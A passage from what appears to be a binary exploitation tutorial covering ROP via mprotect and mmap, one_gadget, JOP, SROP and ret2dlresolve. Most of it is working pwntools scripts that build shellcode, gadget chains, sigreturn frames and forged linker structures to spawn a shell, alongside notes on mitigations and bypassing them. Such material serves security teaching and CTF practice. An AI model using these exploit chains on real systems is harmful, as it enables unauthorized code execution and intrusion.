# Leak libc (assume we have this)
libc.address = leaked_libc_base

# Shellcode
shellcode = asm(shellcraft.amd64.linux.sh())

# mprotect(stack_page, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC)
stack_page = (leaked_stack_addr & ~0xfff)  # Align to page

rop = ROP(libc)
rop.call('mprotect', [stack_page, 0x1000, 7])  # 7 = RWX
rop.raw(stack_page + 0x100)  # Jump to shellcode location

payload = b'A' * offset
payload += rop.chain()
payload += b'\x90' * 0x100  # NOP sled
payload += shellcode

p.send(payload)
p.interactive()
```

**mmap ROP**: Allocate new RWX memory region.

```python
# mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, 
#      MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)

rop = ROP(libc)
rop.call('mmap', [0, 0x1000, 7, 0x22, -1, 0])
# RAX now contains address of new RWX page

# Read shellcode into new page
rop.call('read', [0, 'rax', 0x100])  # read into returned mmap address

# Jump to shellcode
rop.raw('rax')
```

### One-Gadget Techniques

**one_gadget tool**: Find single gadgets in libc that spawn shell.

```bash
# Find one_gadgets in libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# Output example:
# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL
#
# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL
#
# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
```

**Usage in ROP**:

```python
from pwn import *

# After leaking libc base
one_gadget_offset = 0x4f2c5  # From one_gadget tool
one_gadget = libc.address + one_gadget_offset

# Simple ROP to one_gadget
payload = b'A' * offset
payload += p64(one_gadget)

# May need to satisfy constraints:
# - Align stack
# - Set register values
# - Clear specific memory

# Example: Ensure RSP alignment
payload = b'A' * offset
payload += p64(ret_gadget)      # Additional ret for alignment
payload += p64(one_gadget)

# Example: Clear RCX
payload = b'A' * offset
payload += p64(pop_rcx)
payload += p64(0)
payload += p64(one_gadget)
```

### ROP Chain Debugging

**GDB techniques**:

```bash
# Set breakpoints on ret instructions
break *0x401234

# Watch stack pointer
watch $rsp

# Display registers after each instruction
display/i $rip
display/10gx $rsp

# Step through ROP chain
ni  # Next instruction
si  # Step instruction

# Examine gadget execution
x/5i $rip  # Show next 5 instructions
```

**pwndbg visualization**:

```bash
# Context view shows registers, code, stack automatically
context

# Trace ROP chain execution
# Set breakpoint on each ret
catch syscall
catch signal

# Telescope stack to see ROP chain
telescope $rsp 30
```

**Automated ROP verification**:

```python
# In pwntools script
context.log_level = 'debug'  # Verbose output

# Or manually log ROP chain
log.info(rop.dump())

# Verify gadget addresses
for addr in rop.chain():
    log.info(f"Gadget: {hex(addr)}")
```

## Jump-Oriented Programming (JOP)

JOP is similar to ROP but uses gadgets ending in indirect jumps (`jmp`, `call`) instead of `ret`.

### JOP Fundamentals

**Key difference from ROP**:

- ROP: Uses stack-based control flow (ret instructions pop addresses from stack)
- JOP: Uses register-based control flow (jmp/call to addresses in registers)

**JOP gadget structure**:

```asm
; Typical JOP gadget (dispatcher)
gadget:
    pop rax           ; Load next gadget address
    jmp rax           ; Jump to next gadget
    
; Or with register indirect jump
gadget2:
    mov rax, [rbx]    ; Load gadget address from memory
    add rbx, 8        ; Advance to next gadget pointer
    jmp rax           ; Execute next gadget
```

### JOP Dispatcher Pattern

**Central dispatcher**: JOP chains typically revolve around a dispatcher gadget that orchestrates execution.

```asm
; Main dispatcher gadget
dispatcher:
    mov rax, [rsi]       ; Load gadget address from dispatch table
    add rsi, 8           ; Move to next table entry
    jmp rax              ; Execute functional gadget

; Functional gadgets end by jumping back to dispatcher
functional_gadget:
    pop rdi              ; Perform operation
    jmp [rsi-8]          ; Jump back to dispatcher (or next dispatcher)
```

**Exploitation flow**:

```
1. Control RSI to point to dispatch table (controlled memory)
2. Jump to dispatcher
3. Dispatcher loads first gadget address from [RSI]
4. Dispatcher jumps to functional gadget
5. Functional gadget performs operation, jumps back to dispatcher
6. Dispatcher loads next gadget, repeat
```

### JOP vs ROP Comparison

|Feature|ROP|JOP|
|---|---|---|
|Control flow|Stack (ret)|Register (jmp)|
|Gadget ending|ret|jmp/call register|
|Chain storage|Stack|Memory (dispatch table)|
|Stack usage|High|Low|
|Detection|Stack pivot detection|Register-based detection|

### JOP Gadget Types

**Load-and-jump gadgets**:

```asm
; Simple dispatcher
mov rax, [rbx]
jmp rax

; With increment
mov rax, [rcx]
add rcx, 8
jmp rax

; Complex
lodsd              ; EAX = [ESI], ESI += 4
jmp eax
```

**Functional gadgets**:

```asm
; Register manipulation
pop rdi
jmp [rsi]

; Memory operations
mov [rdx], rax
jmp [r12]

; Arithmetic
add rax, rbx
jmp [rcx]

; Function call wrapper
call qword ptr [rax]
jmp [rbx]
```

**Table-based dispatch**:

```asm
; Jump table dispatcher
mov rax, [rbx + rcx*8]
jmp rax

; Switch-case style
cmp eax, 5
ja default_case
lea rbx, [jump_table]
jmp [rbx + rax*8]
```

### Finding JOP Gadgets

**ROPgadget with JOP support**:

```bash
# Find JOP gadgets
ROPgadget --binary ./binary --jop

# Find specific jump patterns
ROPgadget --binary ./binary --jop --only "jmp|call"

# Find dispatcher candidates
ROPgadget --binary ./binary --jop --depth 5
```

**Manual gadget search**:

```bash
# Using objdump
objdump -d ./binary | grep "jmp.*%"
objdump -d ./binary | grep "call.*%"

# Using radare2
r2 ./binary
/c jmp [            # Search for indirect jumps
/c call [           # Search for indirect calls
```

**JOP gadget finder script**:

```python
from pwn import *

elf = ELF('./binary')

def find_jop_gadgets(binary):
    gadgets = []
    code = binary.read(binary.entry, binary.sections['.text'].size)
    
    # Search for jmp/call patterns
    for i in range(len(code) - 4):
        # jmp rax: 0xff 0xe0
        if code[i:i+2] == b'\xff\xe0':
            gadgets.append(('jmp rax', binary.entry + i))
        
        # jmp qword ptr [rax]: 0xff 0x20
        if code[i:i+2] == b'\xff\x20':
            gadgets.append(('jmp [rax]', binary.entry + i))
        
        # call rax: 0xff 0xd0
        if code[i:i+2] == b'\xff\xd0':
            gadgets.append(('call rax', binary.entry + i))
    
    return gadgets

gadgets = find_jop_gadgets(elf)
for desc, addr in gadgets:
    log.info(f"{hex(addr)}: {desc}")
```

### JOP Exploitation Example

```python
from pwn import *

p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Assume we have overflow and can control memory region
controlled_memory = elf.bss(0x1000)

# Find JOP gadgets
# Dispatcher: mov rax, [rbx]; add rbx, 8; jmp rax
dispatcher = 0x401234

# Functional gadgets that jump back to dispatcher
pop_rdi_jmp_rbx = 0x401345  # pop rdi; jmp [rbx-8]
pop_rsi_jmp_rbx = 0x401456  # pop rsi; pop r15; jmp [rbx-8]
syscall_jmp_rbx = 0x401567  # syscall; jmp [rbx-8]

# Build dispatch table in controlled memory
dispatch_table = p64(pop_rdi_jmp_rbx)    # Gadget 1
dispatch_table += p64(dispatcher)         # Next dispatcher address
dispatch_table += p64(binsh_addr)         # Data for gadget 1 (pop rdi)
dispatch_table += p64(pop_rsi_jmp_rbx)    # Gadget 2
dispatch_table += p64(dispatcher)         # Next dispatcher address
dispatch_table += p64(0)                  # Data for gadget 2 (pop rsi)
dispatch_table += p64(0)                  # Data for gadget 2 (pop r15)
dispatch_table += p64(syscall_jmp_rbx)    # Gadget 3
dispatch_table += p64(0)                  # End

# Write dispatch table to controlled memory
write_primitive(controlled_memory, dispatch_table)

# Initial payload to start JOP chain
payload = b'A' * offset
payload += p64(pop_rbx)           # Set RBX to point to dispatch table
payload += p64(controlled_memory)
payload += p64(dispatcher)        # Jump to dispatcher

p.send(payload)
p.interactive()
```

### Advanced JOP Techniques

#### Mixed ROP/JOP Chains

**Combine ROP and JOP** for flexibility:

```python
# Start with ROP to set up registers
rop_stage = p64(pop_rsi)
rop_stage += p64(dispatch_table)
rop_stage += p64(pop_rbx)
rop_stage += p64(dispatch_table + 8)
rop_stage += p64(jop_dispatcher)  # Transition to JOP

# Continue with JOP for remaining operations
jop_stage = build_jop_chain(...)

payload = b'A' * offset + rop_stage
write_memory(dispatch_table, jop_stage)
```

#### Self-Modifying JOP Chains

**Modify dispatch table during execution**:

```asm
; Gadget that modifies its own dispatch table
modify_gadget:
    mov qword ptr [rbx+16], rax  ; Modify future dispatch entry
    jmp [rbx]                     ; Return to dispatcher
```

```python
# Initial dispatch table
table = [
    modify_gadget,     # Will modify table[2]
    dispatcher,
    placeholder,       # Will be overwritten
    next_gadget,
    # ...
]
```

#### JOP with C++ Virtual Tables

**Exploit virtual function calls**:

```cpp
// C++ object with virtual functions
class Base {
public:
    virtual void func1();
    virtual void func2();
    // ...
};

// vtable layout in memory:
// [func1_ptr, func2_ptr, ...]

// If we control object memory, we control vtable pointer
// Each virtual call becomes: call [vtable + offset]
```

```python
# Overwrite vtable pointer to controlled memory
fake_vtable = controlled_memory

# Build fake vtable with JOP gadgets
fake_vtable_content = [
    pop_rdi_gadget,
    pop_rsi_gadget,
    system_addr,
    # ...
]

write_memory(fake_vtable, fake_vtable_content)

# Overwrite object's vtable pointer
object_addr = leaked_addr
write_memory(object_addr, p64(fake_vtable))

# Trigger virtual function call
# obj->func1() becomes call [fake_vtable+0]
```

### JOP Detection and Mitigation

**Detection challenges**:

- No obvious stack anomalies (stack appears normal)
- Control flow through registers harder to track
- Dispatch table can be anywhere in memory

**Mitigations**:

- Control Flow Integrity (CFI): Validates jump targets
- Shadow Stack: Tracks legitimate return addresses
- Control-Flow Guard (CFG): Microsoft's implementation
- Intel CET: Hardware-based control flow enforcement

**Bypass techniques**:

- Find gadgets in legitimate code paths
- Use existing dispatch tables (vtables, jump tables)
- Combine with other techniques to bypass CFI

**[Unverified]**: JOP effectiveness against modern CFI implementations varies. Some CFI schemes focus primarily on return addresses and may be less effective against JOP.

## SROP (Sigreturn-Oriented Programming)

SROP exploits the `sigreturn` system call to set arbitrary register values, enabling powerful primitive with minimal gadgets.

### Signal Handling Background

**Linux signal mechanism**:

```
1. Signal occurs (e.g., SIGSEGV, SIGINT)
2. Kernel saves process context (registers) on stack (sigcontext)
3. Kernel transfers control to signal handler
4. Signal handler executes
5. Signal handler calls sigreturn
6. sigreturn restores saved context from stack
7. Process resumes with restored registers
```

**Sigcontext structure** (x86-64):

```c
struct sigcontext {
    uint64_t r8;
    uint64_t r9;
    uint64_t r10;
    uint64_t r11;
    uint64_t r12;
    uint64_t r13;
    uint64_t r14;
    uint64_t r15;
    uint64_t rdi;
    uint64_t rsi;
    uint64_t rbp;
    uint64_t rbx;
    uint64_t rdx;
    uint64_t rax;
    uint64_t rcx;
    uint64_t rsp;
    uint64_t rip;
    uint64_t eflags;
    uint16_t cs;
    uint16_t gs;
    uint16_t fs;
    uint16_t ss;
    // ... more fields
};
```

### SROP Attack Mechanism

**Exploitation concept**:

1. Control stack to place fake sigcontext frame
2. Execute `sigreturn` syscall (syscall number 15 on x86-64)
3. Kernel reads fake frame, restores all registers to attacker-controlled values
4. Execution continues at attacker-controlled RIP with attacker-controlled register state

**Minimal requirements**:

- **syscall gadget** (or `int 0x80` on x86)
- **Control RAX** to set syscall number to 15
- **Control stack** to place fake sigframe

### Basic SROP Example

```python
from pwn import *

context.arch = 'amd64'
p = process('./vuln')
elf = ELF('./vuln')

# Find necessary gadgets
syscall = 0x401234  # syscall; ret
pop_rax = 0x401567  # pop rax; ret

# Create fake sigreturn frame
frame = SigreturnFrame()
frame.rax = 59                    # sys_execve
frame.rdi = binsh_addr            # arg1: "/bin/sh"
frame.rsi = 0                     # arg2: NULL
frame.rdx = 0                     # arg3: NULL
frame.rip = syscall               # Execute syscall after sigreturn
frame.rsp = stack_addr            # Stack pointer (can be anywhere valid)

# Build exploit
payload = b'A' * offset
payload += p64(pop_rax)
payload += p64(15)                # RAX = 15 (sys_rt_sigreturn)
payload += p64(syscall)           # Call sigreturn
payload += bytes(frame)           # Fake sigcontext

p.send(payload)
p.interactive()
```

**Execution flow**:

```
1. Overflow sets return address to pop_rax
2. pop_rax executes, RAX = 15
3. syscall executes sys_rt_sigreturn (RAX=15)
4. Kernel reads fake sigcontext from stack
5. All registers restored to fake values
6. RIP set to syscall address
7. syscall executes sys_execve (RAX=59 from restored value)
8. Shell spawned!
```

### SROP Frame Construction

**pwntools SigreturnFrame**:

```python
from pwn import *

context.arch = 'amd64'  # or 'i386'

frame = SigreturnFrame()

# Set all necessary registers
frame.rax = 0x3b          # Syscall number (execve)
frame.rdi = binsh_addr    # 1st argument
frame.rsi = argv_addr     # 2nd argument
frame.rdx = envp_addr     # 3rd argument
frame.rcx = 0             # 4th argument (not used by execve)
frame.r8 = 0              # 5th argument
frame.r9 = 0              # 6th argument

# Set instruction pointer
frame.rip = syscall_addr  # Where to jump after sigreturn

# Set stack pointer
frame.rsp = writable_addr # Valid stack location

# Set base pointer (if needed)
frame.rbp = frame.rsp

# Set flags (usually can leave default)
frame.eflags = 0x202      # Common value

# Segment registers (usually leave default)
frame.cs = 0x33           # User code segment (64-bit)
frame.ss = 0x2b           # User data segment

# Convert frame to bytes
frame_bytes = bytes(frame)

# Or access as flat binary
payload = flat(frame)

# Can also modify specific fields
frame.rax = 0x1234
updated_bytes = bytes(frame)
```

**Manual frame construction** (without pwntools):

```python
import struct

def build_sigframe_x64(rax=0, rbx=0, rcx=0, rdx=0, rsi=0, rdi=0,
                       rbp=0, rsp=0, r8=0, r9=0, r10=0, r11=0,
                       r12=0, r13=0, r14=0, r15=0, rip=0,
                       eflags=0x202, cs=0x33, ss=0x2b):
    """Build x86-64 sigreturn frame manually"""
    frame = struct.pack('<Q', r8)
    frame += struct.pack('<Q', r9)
    frame += struct.pack('<Q', r10)
    frame += struct.pack('<Q', r11)
    frame += struct.pack('<Q', r12)
    frame += struct.pack('<Q', r13)
    frame += struct.pack('<Q', r14)
    frame += struct.pack('<Q', r15)
    frame += struct.pack('<Q', rdi)
    frame += struct.pack('<Q', rsi)
    frame += struct.pack('<Q', rbp)
    frame += struct.pack('<Q', rbx)
    frame += struct.pack('<Q', rdx)
    frame += struct.pack('<Q', rax)
    frame += struct.pack('<Q', rcx)
    frame += struct.pack('<Q', rsp)
    frame += struct.pack('<Q', rip)
    frame += struct.pack('<Q', eflags)
    frame += struct.pack('<H', cs)
    frame += struct.pack('<H', 0)  # gs
    frame += struct.pack('<H', 0)  # fs
    frame += struct.pack('<H', ss)
    frame += b'\x00' * 8  # err, trapno
    frame += b'\x00' * 8  # oldmask
    frame += b'\x00' * 8  # cr2
    frame += b'\x00' * 128  # fpstate
    frame += b'\x00' * 64  # reserved
    
    return frame
```

### Advanced SROP Techniques

#### SROP Chain

**Multiple sigreturn frames** for complex operations:

```python
from pwn import *

context.arch = 'amd64'

# Frame 1: Call read() to write more data to known location
frame1 = SigreturnFrame()
frame1.rax = 0                    # sys_read
frame1.rdi = 0                    # fd = stdin
frame1.rsi = bss_addr             # buf = .bss
frame1.rdx = 0x400                # count = 1024
frame1.rip = syscall
frame1.rsp = stack_addr + 0x100   # Stack for next frame

# Frame 2: Call mprotect() to make memory executable  
frame2 = SigreturnFrame()
frame2.rax = 10                   # sys_mprotect
frame2.rdi = bss_addr & ~0xfff    # addr (page-aligned)
frame2.rsi = 0x1000               # len
frame2.rdx = 7                    # prot = RWX
frame2.rip = syscall
frame2.rsp = stack_addr + 0x200

# Frame 3: Execute shellcode
frame3 = SigreturnFrame()
frame3.rip = bss_addr             # Jump to shellcode
frame3.rsp = stack_addr + 0x300

# Build chain
payload = b'A' * offset
payload += p64(pop_rax) + p64(15) + p64(syscall) + bytes(frame1)
payload += p64(pop_rax) + p64(15) + p64(syscall) + bytes(frame2)
payload += p64(pop_rax) + p64(15) + p64(syscall) + bytes(frame3)

p.send(payload)
```

#### SROP with Minimal Gadgets

**One gadget scenario**: Only `syscall; ret` available.

```python
# Challenge: How to set RAX=15 without pop_rax gadget?

# Solution 1: Use read() to control RAX return value
# read() returns number of bytes read in RAX

frame_read = SigreturnFrame()
frame_read.rax = 0                # sys_read
frame_read.rdi = 0                # stdin
frame_read.rsi = stack_addr       # buffer
frame_read.rdx = 15               # count = 15 bytes
frame_read.rip = syscall
frame_read.rsp = stack_addr + 0x100

# After this sigreturn:
# - read(0, stack_addr, 15) executes
# - We send exactly 15 bytes
# - RAX becomes 15
# - Returns to syscall (from frame_read.rsp pointing to syscall address)
# - syscall with RAX=15 triggers sigreturn again

payload = b'A' * offset
payload += p64(syscall)           # Assuming we can set RAX=15 somehow initially
payload += bytes(frame_read)

p.send(payload)

# Send exactly 15 bytes to set RAX=15
p.send(b'A' * 15)

# Now RAX=15, send main sigreturn frame
main_frame = SigreturnFrame()
main_frame.rax = 59               # execve
main_frame.rdi = binsh_addr
main_frame.rsi = 0
main_frame.rdx = 0
main_frame.rip = syscall
main_frame.rsp = stack_addr + 0x200

p.send(bytes(main_frame))
p.interactive()
```

**Solution 2: Blind SROP**

If we can trigger syscall but don't control RAX:

```python
# Brute force syscall numbers by trying different operations
# Some syscalls are idempotent or safe to call repeatedly

# Example: If RAX happens to be small number
# Syscall 0 = read (safe)
# Syscall 1 = write (safe)
# Syscall 2 = open (mostly safe)
# etc.

# Can use timing or other side channels to determine which syscall executed
```

#### SROP with ASLR

**Challenge**: Need addresses for RIP, RSP, arguments.

**Approach**:

```python
# Step 1: Leak addresses using partial SROP
leak_frame = SigreturnFrame()
leak_frame.rax = 1                # sys_write
leak_frame.rdi = 1                # stdout
leak_frame.rsi = got_entry        # Known GOT location (PIE-relative)
leak_frame.rdx = 8                # 8 bytes
leak_frame.rip = syscall
leak_frame.rsp = stack_addr       # Return to main for second stage

# This requires knowing at least one address (e.g., from partial overwrite)

# Step 2: Use leaked address to calculate others
# Step 3: Build final SROP frame with real addresses
```

**PIE bypass with SROP**:

```python
# If we have partial control or known stack layout
# Use stack address from initial context

# Frame that copies stack data to stdout
dump_frame = SigreturnFrame()
dump_frame.rax = 1                # write
dump_frame.rdi = 1                # stdout  
dump_frame.rsi = rsp_value        # Current stack (contains return addresses)
dump_frame.rdx = 0x100            # Dump 256 bytes
dump_frame.rip = syscall
dump_frame.rsp = rsp_value + 0x200

# Parse dumped data for PIE/libc addresses
# Build final exploit with known addresses
```

#### 32-bit SROP

**Differences**:

- Syscall number: 119 (sys_sigreturn on x86)
- Invocation: `int 0x80` instead of `syscall`
- Different sigcontext structure
- Smaller frame (32-bit registers)

```python
context.arch = 'i386'

# Build 32-bit frame
frame = SigreturnFrame()
frame.eax = 11                    # sys_execve
frame.ebx = binsh_addr            # arg1
frame.ecx = 0                     # arg2
frame.edx = 0                     # arg3
frame.eip = int80_gadget          # Execute int 0x80
frame.esp = writable_addr

payload = b'A' * offset
payload += p32(pop_eax)
payload += p32(119)               # sys_sigreturn on x86
payload += p32(int80_gadget)      # int 0x80
payload += bytes(frame)
```

### SROP Use Cases

**Scenario 1: Very limited gadgets**

```python
# Only have: syscall gadget, some buffer overflow
# No pop gadgets, no useful ROP gadgets

# SROP solves this: single syscall gadget is enough
# Can set all registers at once
```

**Scenario 2: Bypassing ASLR with known writable memory**

```python
# Known writable location (e.g., .bss in non-PIE binary)
# Use SROP to call read() and write shellcode there
# Then use SROP again to execute shellcode

frame1 = SigreturnFrame()
frame1.rax = 0                    # read
frame1.rdi = 0
frame1.rsi = elf.bss(0x500)
frame1.rdx = 0x200
frame1.rip = syscall
frame1.rsp = elf.bss(0x400)       # Stack location

# After read completes, RSP=elf.bss(0x400)
# Write next SROP frame there during read()

frame2 = SigreturnFrame()
frame2.rip = elf.bss(0x500)       # Execute shellcode
frame2.rsp = elf.bss(0x700)
```

**Scenario 3: Kernel exploitation**

```python
# SROP can be used in kernel exploits to restore userland context
# After kernel exploitation, use sigreturn to return to controlled state
```

### Practical SROP Example: Full Exploit

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

# Target binary details
p = process('./vuln')
elf = ELF('./vuln')

# Gadgets (very minimal requirements)
syscall_ret = 0x401234  # syscall; ret
pop_rax_ret = 0x401567  # pop rax; ret (if available)

# Known writable memory
bss_base = elf.bss(0x600)

# ==================== Stage 1: Leak libc ====================
# Use SROP to call write() and leak GOT entry

leak_frame = SigreturnFrame()
leak_frame.rax = 1                      # sys_write
leak_frame.rdi = 1                      # fd = stdout
leak_frame.rsi = elf.got['puts']        # buf = GOT entry
leak_frame.rdx = 8                      # count = 8
leak_frame.rip = syscall_ret            # Execute write
leak_frame.rsp = bss_base               # Stack location for stage 2
leak_frame.rbp = bss_base

# Initial payload
payload = b'A' * 0x100  # Overflow to return address

if pop_rax_ret:
    payload += p64(pop_rax_ret)
    payload += p64(15)                  # sys_rt_sigreturn
    payload += p64(syscall_ret)
else:
    # Alternative: use read() to set RAX=15
    # (implementation depends on specific vulnerability)
    pass

payload += bytes(leak_frame)

# Prepare stage 2 payload in memory (sent during write execution)
stage2_addr = bss_base

stage2 = p64(pop_rax_ret)
stage2 += p64(15)
stage2 += p64(syscall_ret)

# Stage 2 frame: Call read() to get shellcode
read_frame = SigreturnFrame()
read_frame.rax = 0                      # sys_read
read_frame.rdi = 0                      # fd = stdin
read_frame.rsi = bss_base + 0x200       # buf = shellcode location
read_frame.rdx = 0x100                  # count = 256
read_frame.rip = syscall_ret
read_frame.rsp = bss_base + 0x100       # Stack for stage 3

stage2 += bytes(read_frame)

# Write stage2 to known location before exploitation
# (assuming we have write primitive or can use read() trick)
# For this example, assume we pre-write it

# Send stage 1
p.send(payload)

# Receive libc leak
p.recvuntil(b'A' * 8)  # Skip padding
libc_leak = u64(p.recv(8))
libc_base = libc_leak - 0x809c0  # Offset to puts in libc
log.success(f"Libc base: {hex(libc_base)}")

# ==================== Stage 2: Write shellcode ====================
# stage2 frame already sent as part of stage1 (in memory)
# Now send stage2 trigger...

# (Assuming stage2 is already in memory and executing)

# Send shellcode when read() executes
shellcode = asm(shellcraft.amd64.linux.sh())
p.send(shellcode)

# ==================== Stage 3: Execute shellcode ====================
# Prepare stage 3 frame
exec_frame = SigreturnFrame()
exec_frame.rip = bss_base + 0x200       # Shellcode location
exec_frame.rsp = bss_base + 0x300       # Valid stack
exec_frame.rbp = bss_base + 0x300

stage3 = p64(pop_rax_ret)
stage3 += p64(15)
stage3 += p64(syscall_ret)
stage3 += bytes(exec_frame)

# This should be written to bss_base+0x100 during stage2 read
# Or trigger via another mechanism
p.send(stage3.ljust(0x100, b'\x00'))

# Shell!
p.interactive()
```

### SROP Detection and Mitigation

**Detection challenges**:

- Sigreturn is legitimate syscall
- No obvious payload signature
- Registers restored to arbitrary values appear normal post-signal

**Mitigations**:

- Seccomp: Block or restrict sigreturn syscall
- Kernel patches: Validate sigreturn frames
- SROP-specific detection heuristics

**Bypass techniques**:

- Combine with other techniques (ROP, heap exploitation)
- Use legitimate signal frames when possible
- Fragment SROP across multiple smaller operations

## ret2dlresolve

ret2dlresolve exploits the dynamic linker's symbol resolution mechanism to call arbitrary functions without knowing their addresses or having them in the PLT.

### Dynamic Linking Review

**PLT (Procedure Linkage Table)** structure:

```asm
; First PLT entry (PLT[0])
plt_0:
    push qword ptr [got + 8]     ; Push link_map
    jmp qword ptr [got + 16]     ; Jump to dl_runtime_resolve

; Subsequent PLT entries (e.g., puts@plt)
puts@plt:
    jmp qword ptr [got + puts_offset]  ; Jump to resolved address
    push reloc_index                    ; Push relocation index
    jmp plt_0                           ; Jump to resolver
```

**Dynamic resolution flow**:

```
1. Call puts@plt
2. First time: GOT contains address of "push reloc_index" instruction
3. Jump back to PLT[0] with relocation index on stack
4. PLT[0] pushes link_map, jumps to _dl_runtime_resolve
5. _dl_runtime_resolve(link_map, reloc_index):
   - Uses reloc_index to find relocation entry
   - Relocation entry points to symbol table entry
   - Symbol table entry contains function name
   - Searches loaded libraries for symbol
   - Updates GOT with resolved address
   - Returns to original caller
6. Subsequent calls: GOT contains actual function address, direct jump
```

### Key Data Structures

**Relocation Entry** (Elf64_Rela):

```c
typedef struct {
    Elf64_Addr r_offset;    // GOT entry address
    Elf64_Xword r_info;     // Symbol index and relocation type
    Elf64_Sxword r_addend;  // Addend (usually 0 for functions)
} Elf64_Rela;

// r_info encodes:
// - Symbol index: r_info >> 32
// - Relocation type: r_info & 0xffffffff
```

**Symbol Table Entry** (Elf64_Sym):

```c
typedef struct {
    Elf64_Word st_name;     // Offset into string table (.dynstr)
    unsigned char st_info;  // Symbol type and binding
    unsigned char st_other; // Symbol visibility
    Elf64_Half st_shndx;    // Section index
    Elf64_Addr st_value;    // Symbol value (address)
    Elf64_Xword st_size;    // Symbol size
} Elf64_Sym;
```

**String Table** (.dynstr):

```
Null-terminated strings containing symbol names
Index by st_name field from symbol table
```

### ret2dlresolve Attack Concept

**Goal**: Forge fake relocation and symbol entries to resolve arbitrary function.

**Steps**:

1. Create fake relocation entry pointing to fake symbol
2. Create fake symbol entry with crafted function name
3. Place function name string in accessible memory
4. Call _dl_runtime_resolve with fake relocation index
5. Resolver reads fake structures, "resolves" our function
6. Our function gets called

### 32-bit ret2dlresolve (Easier)

**Exploit structure**:

```python
from pwn import *

context.arch = 'i386'

elf = ELF('./vuln32')
rop = ROP(elf)

# Addresses from binary
plt_0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.dynamic_value_by_tag('DT_JMPREL')  # .rel.plt address
symtab = elf.dynamic_value_by_tag('DT_SYMTAB')   # .dynsym address
strtab = elf.dynamic_value_by_tag('DT_STRTAB')   # .dynstr address

# Writable memory for fake structures
bss = elf.bss(0x500)

# ==================== Build Fake Structures ====================

# 1. Fake string: "system\x00"
fake_string = bss
fake_string_data = b"system\x00"

# 2. Fake symbol table entry
fake_sym = bss + 0x10
fake_sym_data = flat({
    0x00: (fake_string - strtab),  # st_name (offset in .dynstr)
    0x04: 0x12,                      # st_info (STB_GLOBAL | STT_FUNC)
    0x05: 0,                         # st_other
    0x06: 0,                         # st_shndx
    0x08: 0,                         # st_value
    0x0c: 0                          # st_size
}, filler='\x00')

# 3. Fake relocation entry
fake_reloc = bss + 0x30
fake_reloc_index = (fake_reloc - rel_plt) // 8  # Each Elf32_Rel is 8 bytes

fake_reloc_data = flat({
    0x00: elf.got['puts'],           # r_offset (where to write resolved address)
    0x04: ((fake_sym - symtab) // 16 << 8) | 0x7  # r_info (sym_idx | R_386_JUMP_SLOT)
}, filler='\x00')

# ==================== Build ROP Chain ====================

# Write fake structures to memory
payload = b'A' * offset

# Use read() to write fake structures
payload += p32(rop.find_gadget(['pop ebx', 'ret'])[0])
payload += p32(0)  # fd = stdin
payload += p32(rop.find_gadget(['pop ecx', 'ret'])[0])
payload += p32(bss)  # buf = bss
payload += p32(rop.find_gadget(['pop edx', 'ret'])[0])
payload += p32(0x100)  # count
payload += p32(elf.plt['read'])

# Call _dl_runtime_resolve with fake relocation index
# push link_map (from GOT[1])
payload += p32(rop.find_gadget(['pop ebx', 'ret'])[0])
payload += p32(elf.got['_GLOBAL_OFFSET_TABLE_'] + 4)
payload += p32(rop.find_gadget(['mov eax, [ebx]', 'ret'])[0])
payload += p32(rop.find_gadget(['push eax', 'ret'])[0])

# push reloc_index
payload += p32(rop.find_gadget(['pop eax', 'ret'])[0])
payload += p32(fake_reloc_index)
payload += p32(rop.find_gadget(['push eax', 'ret'])[0])

# push "/bin/sh" address (argument to system)
payload += p32(rop.find_gadget(['pop eax', 'ret'])[0])
payload += p32(bss + 0x100)  # Where we'll write "/bin/sh"
payload += p32(rop.find_gadget(['push eax', 'ret'])[0])

# jump to _dl_runtime_resolve
payload += p32(plt_0 + 6)  # Skip first push in PLT[0]

p.send(payload)

# Send fake structures and "/bin/sh"
fake_data = fake_string_data.ljust(0x10, b'\x00')
fake_data += fake_sym_data.ljust(0x20, b'\x00')
fake_data += fake_reloc_data.ljust(0x50, b'\x00')
fake_data += b"/bin/sh\x00"

p.send(fake_data.ljust(0x100, b'\x00'))

p.interactive()
```

### 64-bit ret2dlresolve (More Complex)

**Challenges on x86-64**:

- Uses Elf64_Rela (with addend field)
- Different relocation types
- More complex resolution

**Modified approach**:

```python
context.arch = 'amd64'

elf = ELF('./vuln64')

# Get dynamic section addresses
rela_plt = elf.dynamic_value_by_tag('DT_JMPREL')  # .rela.plt
symtab = elf.dynamic_value_by_tag('DT_SYMTAB')
strtab = elf.dynamic_value_by_tag('DT_STRTAB')

bss = elf.bss(0x800)

# Build fake structures (similar to 32-bit but different sizes)
# Elf64_Rela is 24 bytes, Elf64_Sym is 24 bytes

fake_string = bss
fake_sym = bss + 0x20
fake_reloc = bss + 0x50

# Fake symbol
fake_sym_data = flat({
    0x00: (fake_string - strtab) & 0xffffffff,  # st_name
    0x04: 0x12,                                   # st_info
    0x05: 0,                                      # st_other
    0x06: 0,                                      # st_shndx
    0x08: 0,                                      # st_value
    0x10: 0                                       # st_size
}, word_size=64, filler='\x00')

# Fake relocation
sym_index = (fake_sym - symtab) // 24
fake_reloc_data = flat({
    0x00: elf.got['puts'],                       # r_offset
    0x08: (sym_index << 32) | 7,                 # r_info (R_X86_64_JUMP_SLOT)
    0x10: 0                                       # r_addend
}, word_size=64, filler='\x00')

# Calculate reloc_index
reloc_index = (fake_reloc - rela_plt) // 24

# ROP chain (more complex due to calling convention)
```

**[Inference]**: 64-bit ret2dlresolve requires more complex ROP chains due to the calling convention (arguments in registers). The exact implementation depends on available gadgets.

### Automated ret2dlresolve with pwntools

**pwntools Ret2dlresolvePayload** (32-bit):

```python
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

elf = ELF('./vuln32')
rop = ROP(elf)

# Create ret2dlresolve payload
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

# Build ROP chain
rop.read(0, dlresolve.data_addr)  # Read fake structures
